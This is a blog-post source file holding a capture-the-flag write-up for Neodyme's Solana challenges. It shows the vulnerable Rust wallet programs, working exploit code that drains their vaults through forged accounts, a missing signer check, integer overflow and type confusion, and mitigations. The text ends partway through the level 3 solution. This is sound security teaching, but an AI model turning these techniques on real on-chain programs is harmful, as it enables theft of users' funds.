import { Blog } from "../blog-data";

export const NeodymeSolanaCTFWriteup: Blog = {
  slug: "neodyme-solana-ctf-writeup",
  title: "Neodyme Solana CTFs Writeup",
  excerpt:
    "A detailed writeups of the Neodyme Solana CTFs challenges from level0 to level4",
  date: "2025-12-1",
  readTime: "30 min read",
  tags: [
    "CTF",
    "Smart Contract Security",
    "Solana",
    "Rust",
    "Anchor"
  ],
  image: "images/blogs/neodymeSolanaCTF.png",
  content: `


# Setup:

I used the docker for local setup of these challenges:
Here is the process that I did:

Step 1 — Install Docker:

Download Mac version:

[https://www.docker.com/products/docker-desktop/](https://www.docker.com/products/docker-desktop/)

Open Docker → ensure it's running.

Step2 - Run the workshop container

Copy–paste this command in your terminal:

\`\`\`javascript
docker run --name breakpoint-workshop \
  -p 2222:22 \
  -p 8080:80 \
  -e PASSWORD="password" \
  neodymelabs/breakpoint-workshop:latest-code-prebuilt

\`\`\`

This container includes:

✔ solana-toolchain

✔ rust + cargo

✔ bpf dependencies

✔ poc-framework

✔ exploit harness code

✔ VSCode Server in browser

✔ all challenge contracts installed

Step 3 — Open VSCode in your browser

\`\`\`jsx
open this      : http://127.0.0.1:8080
enter password : password
\`\`\`

Step 4 -  Build & Run Exploits

\`\`\`jsx
Press: Command + Shift + B 
\`\`\`

You’ll see a list like:

- build contracts
- run level0 exploit
- run level1 exploit
- run level2 exploit
- …

Select:

✔ **level0 exploit** to run your first challenge

The exploit re-builds the BPF contract automatically.

My Solutions repo: [https://github.com/BhaskarPeruri/Neodyme_SolanaCTF_Solutions](https://github.com/BhaskarPeruri/Neodyme_SolanaCTF_Solutions)

# Level 0:

### Challenge:

Our goal is to increase the balance of the hacker.

Let’s understand the given programs:

\`\`\`rust
//lib.rs
use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    entrypoint,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    system_program, sysvar,
};

#[derive(Debug, BorshDeserialize, BorshSerialize)]

pub enum WalletInstruction {
    /// Initialize a Personal Savings Wallet
    ///
    /// Passed accounts:
    ///
    /// (1) Wallet account
    /// (2) Vault accounts
    /// (3) Authority
    /// (4) Rent sysvar
    /// (5) System program
    Initialize,
    /// Deposit
    ///
    /// Passed accounts:
    ///
    /// (1) Wallet account
    /// (2) Vault accounts
    /// (3) Money Source
    Deposit { amount: u64 },
    /// Withdraw from Wallet
    ///
    /// Passed accounts:
    ///
    /// (1) Wallet account
    /// (2) Vault accounts
    /// (3) Authority
    /// (4) Target Wallet account
    Withdraw { amount: u64 },
}

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct Wallet {
    pub authority: Pubkey,
    pub vault: Pubkey,
}

pub const WALLET_LEN: u64 = 32 + 32;

pub mod processor;
use processor::process_instruction;
entrypoint!(process_instruction);

pub fn get_wallet_address(authority: Pubkey, wallet_program: Pubkey) -> Pubkey {
    let (wallet_address, _) =
        Pubkey::find_program_address(&[&authority.to_bytes()], &wallet_program);
    wallet_address
}

pub fn get_vault_address(authority: Pubkey, wallet_program: Pubkey) -> Pubkey {
    let (vault_address, _) = Pubkey::find_program_address(
        &[&authority.to_bytes(), &"VAULT".as_bytes()],
        &wallet_program,
    );
    vault_address
}

pub fn initialize(wallet_program: Pubkey, authority_address: Pubkey) -> Instruction {
    let wallet_address = get_wallet_address(authority_address, wallet_program);
    let vault_address = get_vault_address(authority_address, wallet_program);
    Instruction {
        program_id: wallet_program,
        accounts: vec![
            AccountMeta::new(wallet_address, false),
            AccountMeta::new(vault_address, false),
            AccountMeta::new(authority_address, true),
            AccountMeta::new_readonly(sysvar::rent::id(), false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: WalletInstruction::Initialize.try_to_vec().unwrap(),
    }
}

pub fn deposit(
    wallet_program: Pubkey,
    authority_address: Pubkey,
    source: Pubkey,
    amount: u64,
) -> Instruction {
    let wallet_address = get_wallet_address(authority_address, wallet_program);
    let vault_address = get_vault_address(authority_address, wallet_program);
    Instruction {
        program_id: wallet_program,
        accounts: vec![
            AccountMeta::new(wallet_address, false),
            AccountMeta::new(vault_address, false),
            AccountMeta::new(source, true),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: WalletInstruction::Deposit { amount }.try_to_vec().unwrap(),
    }
}

pub fn withdraw(
    wallet_program: Pubkey,
    authority_address: Pubkey,
    destination: Pubkey,
    amount: u64,
) -> Instruction {
    let wallet_address = get_wallet_address(authority_address, wallet_program);
    let vault_address = get_vault_address(authority_address, wallet_program);
    Instruction {
        program_id: wallet_program,
        accounts: vec![
            AccountMeta::new(wallet_address, false),
            AccountMeta::new(vault_address, false),
            AccountMeta::new(authority_address, true),
            AccountMeta::new(destination, false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
    }
}
\`\`\`

The [lib.rs](http://lib.rs) file defines the public interface and data model for Solana wallet program.

It declares the WalletInstruction enum, which represents the three actions. They are user can perform - initialise a wallet, deposit SOL, withdraw SOL —each encoded using Borsh serialisation.

The Wallet struct describes the on-chain wallet state, storing the authority(owner) and the vault address where funds are held.

Let’s explore the main logic:

\`\`\`javascript
//processor.rs
use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    program::{invoke, invoke_signed},
    program_error::ProgramError,
    pubkey::Pubkey,
    rent::Rent,
    system_instruction,
    sysvar::Sysvar,
};

use crate::{Wallet, WalletInstruction, WALLET_LEN};

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    mut instruction_data: &[u8],
) -> ProgramResult {
    match WalletInstruction::deserialize(&mut instruction_data)? {
        WalletInstruction::Initialize => initialize(program_id, accounts),
        WalletInstruction::Deposit { amount } => deposit(program_id, accounts, amount),
        WalletInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),
    }
}

fn initialize(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let wallet_info = next_account_info(account_info_iter)?;
    let vault_info = next_account_info(account_info_iter)?;
    let authority_info = next_account_info(account_info_iter)?;
    let rent_info = next_account_info(account_info_iter)?;
    let (wallet_address, wallet_seed) =
        Pubkey::find_program_address(&[&authority_info.key.to_bytes()], program_id);
    let (vault_address, vault_seed) = Pubkey::find_program_address(
        &[&authority_info.key.to_bytes(), &"VAULT".as_bytes()],
        program_id,
    );

    let rent = Rent::from_account_info(rent_info)?;

    assert_eq!(*wallet_info.key, wallet_address);
    assert!(wallet_info.data_is_empty());

    invoke_signed(
        &system_instruction::create_account(
            &authority_info.key,
            &wallet_address,
            rent.minimum_balance(WALLET_LEN as usize),
            WALLET_LEN,
            &program_id,
        ),
        &[authority_info.clone(), wallet_info.clone()],
        &[&[&authority_info.key.to_bytes(), &[wallet_seed]]],
    )?;

    invoke_signed(
        &system_instruction::create_account(
            &authority_info.key,
            &vault_address,
            rent.minimum_balance(0),
            0,
            &program_id,
        ),
        &[authority_info.clone(), vault_info.clone()],
        &[&[
            &authority_info.key.to_bytes(),
            &"VAULT".as_bytes(),
            &[vault_seed],
        ]],
    )?;

    let wallet = Wallet {
        authority: *authority_info.key,
        vault: vault_address,
    };

    wallet
        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])
        .unwrap();

    Ok(())
}

fn deposit(_program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let wallet_info = next_account_info(account_info_iter)?;
    let vault_info = next_account_info(account_info_iter)?;
    let source_info = next_account_info(account_info_iter)?;
    let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;

    assert_eq!(wallet.vault, *vault_info.key);

    invoke(
        &system_instruction::transfer(&source_info.key, &vault_info.key, amount),
        &[vault_info.clone(), source_info.clone()],
    )?;

    Ok(())
}

fn withdraw(_program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let wallet_info = next_account_info(account_info_iter)?;
    let vault_info = next_account_info(account_info_iter)?;
    let authority_info = next_account_info(account_info_iter)?;
    let destination_info = next_account_info(account_info_iter)?;
    let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;

    assert!(authority_info.is_signer);
    assert_eq!(wallet.authority, *authority_info.key);
    assert_eq!(wallet.vault, *vault_info.key);

    if amount > **vault_info.lamports.borrow_mut() {
        return Err(ProgramError::InsufficientFunds);
    }

    **vault_info.lamports.borrow_mut() -= amount;
    **destination_info.lamports.borrow_mut() += amount;

    Ok(())
}
\`\`\`

This [processor.rs](http://processor.rs) file contains the core execution logic of the Solana wallet program and is responsible for handling all on-chain instructions.

The process_instruction function acts like a router and it deserialises the incoming instruction data and dispatches the execution to initialise, deposit or withdraw based on the instruction variant.

The initialise function creates the wallet and vault accounts using Program Derived Addresses(PDAs), funds them with rent-exempt balances and stores the wallet state (authority and vault) in the wallet account.

The deposit function reads the wallet state from account data and verifies the correct vault is provided and moves SOL into the vault using the system transfer.

Finally, the withdraw function allows the authority signer to move SOL out of the vault, but it trusts the provided wallet account data without verifying its ownership or PDA derivation. 

We are going to use this fault logic to exploit the vault :)

Let’s explore the setup how the vault got funded initially.

\`\`\`javascript
use std::{env, str::FromStr};

use owo_colors::OwoColorize;

use poc_framework::solana_sdk::signature::Keypair;
use poc_framework::{
    keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
};

use pocs::assert_tx_success;
use solana_program::native_token::lamports_to_sol;
use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};

struct Challenge {
    hacker: Keypair,
    wallet_program: Pubkey,
    wallet_address: Pubkey,
    vault_address: Pubkey,
    wallet_authority: Pubkey,
}

// Do your hacks in this function here
fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {

/*
SETUP CODE BELOW
*/
pub fn main() {
    let (mut env, challenge, internal) = setup();
    let before_balance = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;
    hack(&mut env, &challenge);
    verify(&mut env, challenge, before_balance, internal);
}

struct Internal {
    wallet_authority: Keypair,
    wallet_amount: u64,
}

fn verify(
    env: &mut LocalEnvironment,
    challenge: Challenge,
    before_balance: u64,
    internal: Internal,
) {
    let after = env.get_account(challenge.hacker.pubkey()).unwrap().lamports;

    let tx = env.execute_as_transaction(
        &[level0::withdraw(
            challenge.wallet_program,
            challenge.wallet_authority,
            challenge.wallet_address,
            internal.wallet_amount,
        )],
        &[&internal.wallet_authority],
    );
    tx.print_named("Verification: authority withdraw");

    if tx.transaction.meta.unwrap().err.is_none() {
        println!(
            "[*] {}",
            "Original wallet authority successfully withdrew all funds.".red()
        )
    } else {
        println!(
            "[!] {}",
            "Original wallet authority cannot withdraw his funds anymore.".green()
        )
    }

    if after > before_balance {
        println!("[*] {}", "Congratulations, the exploit succeeded!".green());
        println!(
            "[*] Hacker has {} SOL more! ({} vs {})",
            lamports_to_sol(after - before_balance).green(),
            before_balance,
            after
        );
    } else {
        println!("[*] {}", "Exploit not successful.".red());
        println!(
            "[*] Hacker has {} SOL less! ({} vs {})",
            lamports_to_sol(before_balance - after).red(),
            before_balance,
            after
        );
    }
}

fn setup() -> (LocalEnvironment, Challenge, Internal) {
    let mut dir = env::current_exe().unwrap();
    let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("level0.so");
        dir.to_str()
    }
    .unwrap();

    let wallet_program = Pubkey::from_str("W4113t3333333333333333333333333333333333333").unwrap();
    let wallet_authority = keypair(0);
    let rich_boi = keypair(1);
    let hacker = keypair(42);

    let a_lot_of_money = sol_to_lamports(1_000_000.0);

    let mut env = LocalEnvironment::builder()
        .add_program(wallet_program, path)
        .add_account_with_lamports(
            wallet_authority.pubkey(),
            system_program::ID,
            sol_to_lamports(100.0),
        )
        .add_account_with_lamports(rich_boi.pubkey(), system_program::ID, a_lot_of_money * 2)
        .add_account_with_lamports(hacker.pubkey(), system_program::ID, sol_to_lamports(1.0))
        .build();

    let wallet_address = level0::get_wallet_address(wallet_authority.pubkey(), wallet_program);

    let vault_address = level0::get_vault_address(wallet_authority.pubkey(), wallet_program);

    // Create Wallet
    assert_tx_success(env.execute_as_transaction(
        &[level0::initialize(
            wallet_program,
            wallet_authority.pubkey(),
        )],
        &[&wallet_authority],
    ));

    println!("[*] Wallet created!");

    // rich boi pays for bill
    assert_tx_success(env.execute_as_transaction(
        &[level0::deposit(
            wallet_program,
            wallet_authority.pubkey(),
            rich_boi.pubkey(),
            a_lot_of_money,
        )],
        &[&rich_boi],
    ));
    println!("[*] rich boi payed his bills");

    (
        env,
        Challenge {
            wallet_address,
            vault_address,
            hacker,
            wallet_program,
            wallet_authority: wallet_authority.pubkey(),
        },
        Internal {
            wallet_authority,
            wallet_amount: a_lot_of_money,
        },
    )
}
\`\`\`

During setup, the wallet and vault PDAs are created via initialize, and then rich_boi transfers 1,000,000 SOL into the vault by calling the program’s deposit instruction, so the vault ends up holding all the funds.

The vulnerable funds are therefore stored in vault_address, which belongs to the wallet program and is supposed to be withdrawable only by wallet_authority.

Let’s exploit the **withdraw** function with the below solution:

### Solution

\`\`\`javascript
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {

        //  Decide loot
        let withdraw_amount = sol_to_lamports(1_000_000.0);
    
        //  Attacker-controlled values
        let attacker_kp = &challenge.hacker;
        let attacker_pubkey = attacker_kp.pubkey();
        let target_vault = challenge.vault_address;
    
        // Manually encode wallet data 
        let mut forged_wallet_data = Vec::with_capacity(64);
        forged_wallet_data.extend_from_slice(attacker_pubkey.as_ref());
        forged_wallet_data.extend_from_slice(target_vault.as_ref());
    
        // Create fake wallet account
        let fake_wallet_kp = keypair(77);
        env.create_account_with_data(&fake_wallet_kp, forged_wallet_data);
    
       
        let withdraw_ix = Instruction::new_with_borsh(
            challenge.wallet_program,
            &WalletInstruction::Withdraw {
                amount: withdraw_amount,
            },
            vec![
                AccountMeta::new(fake_wallet_kp.pubkey(), false),
                AccountMeta::new(target_vault, false),
                AccountMeta::new(attacker_pubkey, true),
                AccountMeta::new(attacker_pubkey, false),
                AccountMeta::new_readonly(system_program::id(), false),
            ],
        );
    
        //  Execute the txn
        env.execute_as_transaction(&[withdraw_ix], &[attacker_kp]).print();
    }
    
    

\`\`\`

When the exploit is successful, you will get the below:

### Output:

![Delegate Address Screenshot](/images/Neodyme/level0.png)



### Mitigation of this exploit:

\`\`\`javascript
assert_eq!(wallet_info.owner, _program_id);
\`\`\`

# Level 1:

### Challenge:

Our goal is to increase the balance of the hacker.

Let’s explore the given [processor.rs](http://processor.rs) file:

\`\`\`javascript
//processor.rs file
//...
//code
//...
fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    msg!("withdraw {}", amount);
    let account_info_iter = &mut accounts.iter();
    let wallet_info = next_account_info(account_info_iter)?;
    let authority_info = next_account_info(account_info_iter)?;
    let destination_info = next_account_info(account_info_iter)?;
    let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;

    assert_eq!(wallet_info.owner, program_id);
    assert_eq!(wallet.authority, *authority_info.key);

    if amount > **wallet_info.lamports.borrow_mut() {
        return Err(ProgramError::InsufficientFunds);
    }

    **wallet_info.lamports.borrow_mut() -= amount;
    **destination_info.lamports.borrow_mut() += amount;

    wallet
        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])
        .unwrap();

    Ok(())
}
\`\`\`
This level is also similar to level 0. The bug resides in the withdraw function that it is missing the signer check on the authority account. So that anyone can pass the correct authority public key without a signature and withdraw funds.

We can make use of this bug to exploit :)

### Solution:

\`\`\`javascript
use solana_program::instruction::{AccountMeta, Instruction};

fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {

        // Amount to drain
        let steal_amount = sol_to_lamports(1_000_000.0);
    
        
        // Attacker signer
        let hacker = &challenge.hacker;
        let hacker_pubkey = hacker.pubkey();
    
        // Build withdraw instruction using helper-style construction
        let withdraw_ix = Instruction::new_with_borsh(
            challenge.wallet_program,
            &level1::WalletInstruction::Withdraw {
                amount: steal_amount,
            },
            vec![
                AccountMeta::new(challenge.wallet_address, false),      // target wallet
                AccountMeta::new(challenge.wallet_authority, false),    // real authority (not signer)
                AccountMeta::new(hacker_pubkey, true),                  // attacker (signer)
                AccountMeta::new_readonly(system_program::id(), false),
            ],
        );
    
        // Execute malicious transaction
        env.execute_as_transaction(&[withdraw_ix], &[hacker]);
    }
    
\`\`\`

### Output:

![Delegate Address Screenshot](/images/Neodyme/level1.png)



### Mitigation of this exploit:

\`\`\`javascript
    assert!(
        authority_info.is_signer,
        "Withdraw must be signed by wallet authority"
    );
\`\`\`

# Level 2

### Challenge:

Our goal is to increase the balance of the hacker.

In this level, [lib.rs](http://lib.rs) file is almost same as the above levels and let’s focus more on the [processor.rs](http://processor.rs) file.

\`\`\`javascript

//processor.rs file 
use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    msg,
    program::{invoke, invoke_signed},
    program_error::ProgramError,
    pubkey::Pubkey,
    rent::Rent,
    system_instruction,
    sysvar::Sysvar,
};

use crate::{Wallet, WalletInstruction, WALLET_LEN};

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    mut instruction_data: &[u8],
) -> ProgramResult {
    match WalletInstruction::deserialize(&mut instruction_data)? {
        WalletInstruction::Initialize => initialize(program_id, accounts),
        WalletInstruction::Deposit { amount } => deposit(program_id, accounts, amount),
        WalletInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),
    }
}

fn initialize(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    msg!("init");
    let account_info_iter = &mut accounts.iter();
    let wallet_info = next_account_info(account_info_iter)?;
    let authority = next_account_info(account_info_iter)?;
    let rent_info = next_account_info(account_info_iter)?;
    let (wallet_address, wallet_seed) =
        Pubkey::find_program_address(&[&authority.key.to_bytes()], program_id);
    let rent = Rent::from_account_info(rent_info)?;

    assert_eq!(*wallet_info.key, wallet_address);
    assert!(wallet_info.data_is_empty());
    assert!(authority.is_signer, "authority must sign!");

    invoke_signed(
        &system_instruction::create_account(
            &authority.key,
            &wallet_address,
            rent.minimum_balance(WALLET_LEN as usize),
            WALLET_LEN,
            &program_id,
        ),
        &[authority.clone(), wallet_info.clone()],
        &[&[&authority.key.to_bytes(), &[wallet_seed]]],
    )?;

    let wallet = Wallet {
        authority: *authority.key,
    };

    wallet
        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])
        .unwrap();

    Ok(())
}

fn deposit(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    msg!("deposit {}", amount);
    let account_info_iter = &mut accounts.iter();
    let wallet_info = next_account_info(account_info_iter)?;
    let source_info = next_account_info(account_info_iter)?;

    assert_eq!(wallet_info.owner, program_id);

    invoke(
        &system_instruction::transfer(&source_info.key, &wallet_info.key, amount),
        &[wallet_info.clone(), source_info.clone()],
    )?;

    Ok(())
}

fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    msg!("withdraw {}", amount);
    let account_info_iter = &mut accounts.iter();
    let wallet_info = next_account_info(account_info_iter)?;
    let authority_info = next_account_info(account_info_iter)?;
    let destination_info = next_account_info(account_info_iter)?;
    let rent_info = next_account_info(account_info_iter)?;

    let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;
    let rent = Rent::from_account_info(rent_info)?;

    assert_eq!(wallet_info.owner, program_id);
    assert_eq!(wallet.authority, *authority_info.key);
    assert!(authority_info.is_signer, "authority must sign!");

    let min_balance = rent.minimum_balance(WALLET_LEN as usize);
    if min_balance + amount > **wallet_info.lamports.borrow_mut() {
        return Err(ProgramError::InsufficientFunds);
    }

    **wallet_info.lamports.borrow_mut() -= amount;
    **destination_info.lamports.borrow_mut() += amount;

    wallet
        .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])
        .unwrap();

    Ok(())
}
\`\`\`

initialise function in the above program derives a PDA wallet address from the authority’s public key, creates that account with the minimum rent -exempt balance and program ownership and stores the authority inside the wallet’s data.

deposit function verifies that the wallet is owned by the program and uses the system program to transfer lamports from a user-signed source account into the wallet.

withdraw function checks that the caller matches the stored authority and that the wallet retain its rent-exempt minimum before modifying lamport balances.

But when we closely look at the withdraw function it **performs unchecked u64 arithmetic on lamports**, allowing overflow/underflow that can invert the transfer logic and be exploited. 

All arithmetic operations in withdraw function  is performed using u64, **without checked math**.

If  amount > wallet_balance, thenwallet_balance - amount **underflows** and wraps around.
Likewise, destination_balance + amount can overflow.

The guard condition itself is vulnerable  that if amount is very large (close to u64::MAX),

then min_balance + amount can overflow and wrap back to a **small value**, causing the check to pass.

Our ***strategy*** is to create a wallet controlled by the hacker and trigger underflow and overflow  to “pump” lamports to the hacker’s wallet and finally withdraw funds to the hacker’s  wallet.

## Solution:

\`\`\`javascript
//imports 
use borsh::BorshSerialize;
use level2::{self, WalletInstruction, get_wallet_address};
use solana_program::{instruction::Instruction, instruction::AccountMeta, sysvar};

// Do your hacks in this function here
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    let wallet_min_balance = env.get_rent_excemption(32);
    let overflow_base:u64 = u64::MAX- wallet_min_balance + 1;
    
    //create hackers wallet 
    env.execute_as_transaction(
        &[level2::initialize(
            challenge.wallet_program,
            challenge.hacker.pubkey(),
        )],
        &[&challenge.hacker],
    );

    let hacker_wallet = get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);

    for i in 0..3{
        let withdraw_amount = overflow_base + i;
        env.execute_as_transaction(&[Instruction{
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(hacker_wallet, false),
                AccountMeta::new(challenge.hacker.pubkey(), true),
                AccountMeta::new(challenge.wallet_address, false), 
                AccountMeta::new_readonly(sysvar::rent::id(), false),
            ],
            data: WalletInstruction::Withdraw{amount:withdraw_amount}.try_to_vec().unwrap(),
        }], &[&challenge.hacker],);

       
        
    }
    let payout = wallet_min_balance * 3 - wallet_min_balance / 2;
    env.execute_as_transaction(&[Instruction{
        program_id: challenge.wallet_program,
        accounts: vec![
            AccountMeta::new(hacker_wallet, false),
            AccountMeta::new(challenge.hacker.pubkey(), true),
            AccountMeta::new(challenge.hacker.pubkey(), false),
            AccountMeta::new_readonly(sysvar::rent::id(), false),
        ],
        data: WalletInstruction::Withdraw{amount: payout}.try_to_vec().unwrap(),
    }], &[&challenge.hacker],);
    

}

\`\`\`

## Output:

![Delegate Address Screenshot](/images/Neodyme/level2.png)

## Mitigation of this exploit:

\`\`\`javascript
//replace the math with checked math in the withdraw 
let mut wallet_info_lapmorts = wallet_info.lamports.borrow_mut();
**wallet_info_lapmorts = (**wallet_info_lapmorts).checked_sub(amount).unwrap();

let mut destination_info_lapmorts = destination_info.lamports.borrow_mut();
**destination_info_lapmorts = (**destination_info_lapmorts).checked_add(amount).unwrap();

\`\`\`

# Level 3

## Challenge:

Goal is as usual to increase the balance of the hacker.

In this level, there is  Vault that holds all deposited SOL and the TipPool that tracks tips and withdrawal authority. 

\`\`\`javascript
//lib.rs
//...
#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct TipPool {
    pub withdraw_authority: Pubkey,
    pub value: u64,
    pub vault: Pubkey,
}

pub const TIP_POOL_LEN: u64 = 32 + 8 + 32;

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct Vault {
    pub creator: Pubkey,
    pub fee: f64,              //reserved for future use
    pub fee_recipient: Pubkey, //reserved for future use
    pub seed: u8,
}
//...
//processor.rs
//...
fn initialize(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    seed: u8,
    fee: f64,
    fee_recipient: Pubkey,
) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let vault_info = next_account_info(account_info_iter)?;
    let initializer_info = next_account_info(account_info_iter)?;
    let rent_info = next_account_info(account_info_iter)?;
    let rent = Rent::from_account_info(rent_info)?;
    let vault_address = Pubkey::create_program_address(&[&[seed]], program_id).unwrap();

    assert_eq!(*vault_info.key, vault_address);
    assert!(
        vault_info.data_is_empty(),
        "vault info must be empty account!"
    );
    assert!(initializer_info.is_signer, "initializer must sign!");

    invoke_signed(
        &system_instruction::create_account(
            &initializer_info.key,
            &vault_address,
            rent.minimum_balance(VAULT_LEN as usize),
            VAULT_LEN,
            &program_id,
        ),
        &[initializer_info.clone(), vault_info.clone()],
        &[&[&[seed]]],
    )?;

    let vault = Vault {
        creator: *initializer_info.key,
        fee,
        fee_recipient,
        seed,
    };

    vault
        .serialize(&mut &mut vault_info.data.borrow_mut()[..])
        .unwrap();

    Ok(())
}

fn create_pool(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let vault_info = next_account_info(account_info_iter)?;
    let withdraw_authority_info = next_account_info(account_info_iter)?;
    let pool_info = next_account_info(account_info_iter)?;

    assert_eq!(vault_info.owner, program_id);
    assert!(
        withdraw_authority_info.is_signer,
        "withdraw authority must sign!"
    );
    assert_eq!(pool_info.owner, program_id);
    // check that account is uninitialized
    if pool_info.data.borrow_mut().into_iter().any(|b| *b != 0) {
        return Err(ProgramError::AccountAlreadyInitialized);
    }

    let pool = TipPool {
        withdraw_authority: *withdraw_authority_info.key,
        value: 0,
        vault: *vault_info.key,
    };

    pool.serialize(&mut &mut pool_info.data.borrow_mut()[..])
        .unwrap();

    Ok(())
}

fn tip(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let vault_info = next_account_info(account_info_iter)?;
    let pool_info = next_account_info(account_info_iter)?;
    let source_info = next_account_info(account_info_iter)?;
    let mut pool = TipPool::deserialize(&mut &(*pool_info.data).borrow_mut()[..])?;

    assert_eq!(vault_info.owner, program_id);
    assert_eq!(pool_info.owner, program_id);
    assert_eq!(pool.vault, *vault_info.key);

    invoke(
        &system_instruction::transfer(&source_info.key, &vault_info.key, amount),
        &[vault_info.clone(), source_info.clone()],
    )?;

    pool.value = match pool.value.checked_add(amount) {
        Some(v) => v,
        None => return Err(ProgramError::InvalidArgument),
    };

    pool.serialize(&mut &mut pool_info.data.borrow_mut()[..])
        .unwrap();

    Ok(())
}

fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();
    let vault_info = next_account_info(account_info_iter)?;
    let pool_info = next_account_info(account_info_iter)?;
    let withdraw_authority_info = next_account_info(account_info_iter)?;
    let mut pool = TipPool::deserialize(&mut &(*pool_info.data).borrow_mut()[..])?;

    assert_eq!(vault_info.owner, program_id);
    assert_eq!(pool_info.owner, program_id);
    assert!(
        withdraw_authority_info.is_signer,
        "withdraw authority must sign"
    );
    assert_eq!(pool.vault, *vault_info.key);
    assert_eq!(*withdraw_authority_info.key, pool.withdraw_authority);

    pool.value = match pool.value.checked_sub(amount) {
        Some(v) => v,
        None => return Err(ProgramError::InvalidArgument),
    };

    **(*vault_info).lamports.borrow_mut() -= amount;
    **(*withdraw_authority_info).lamports.borrow_mut() += amount;

    pool.serialize(&mut &mut pool_info.data.borrow_mut()[..])
        .unwrap();

    Ok(())
}

\`\`\`

The processor.rs file contains the **core on-chain execution logic** of the program, where incoming instructions are deserialised and routed to the appropriate handlers.

The initialize function creates a vault as a PDA, funds it with rent-exempt lamports, and stores vault metadata such as the creator and seed. 

The create_pool function sets up a tip pool linked to a vault and assigns a withdrawal authority while ensuring the pool account is uninitialised. 

The tip function transfers SOL from a user into the vault and increments the pool’s recorded balance.

Finally, the withdraw function allows the designated authority to withdraw SOL from the vault after performing ownership, signer, and balance checks.

Although there are  checks in the withdraw function,

\`\`\`javascript
    assert_eq!(vault_info.owner, program_id); //Vault must be program-owned
    assert_eq!(pool_info.owner, program_id); //Pool must be program-owned
    assert!(
        withdraw_authority_info.is_signer, // Authority must sign
        "withdraw authority must sign"
    );
    assert_eq!(pool.vault, *vault_info.key);  //makes sure the pool claims ownership of the specific vault account passed into the instruction
    assert_eq!(*withdraw_authority_info.key, pool.withdraw_authority); //verifies the signer attempting the withdrawal matches the withdrawal authority stored inside the pool’s state.

\`\`\`

But it contains the critical bug is that blindly deserializes arbitrary account data into TipPool 

\`\`\`javascript
let mut pool = TipPool::deserialize(&mut &(*pool_info.data).borrow_mut()[..])?;
\`\`\`
Let’s compare memory layouts:

\`\`\`javascript
// TipPool (expected by withdraw)
pub struct TipPool {
    withdraw_authority: Pubkey, // 32
    value: u64,                 // 8
    vault: Pubkey,              // 32
}
// Vault (what attacker controls via Initialize)
pub struct Vault {
    creator: Pubkey,            // 32 -> interpreted as withdraw_authority
    fee: f64,                   // 8  -> interpreted as value
    fee_recipient: Pubkey,      //32 -> interpreted as vault
    seed: u8,                   // ignored
}

\`\`\`

In rust, f64 is serialized as **raw 8 bytes.** So, when  reinterpreted as u64 it becomes very large value.

Our ***strategy*** is to create a fake pool that is actually a vault and forge the vault fields creator as the hacker,  fee = 2.0 and fee_recipient as real_vault. Then call withdraw() with vault_info = real vault, pool_info = fake vault and  withdraw_authority = hacker 

## Solution

\`\`\`javascript
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    // derive a fresh PDA that will masquerade as a TipPool
    let fake_seed: u8 = 9;
    let fake_pool_pda =
        Pubkey::create_program_address(&[&[fake_seed]], &challenge.tip_program).unwrap();

    // choose a withdrawal amount larger than the real pool balance
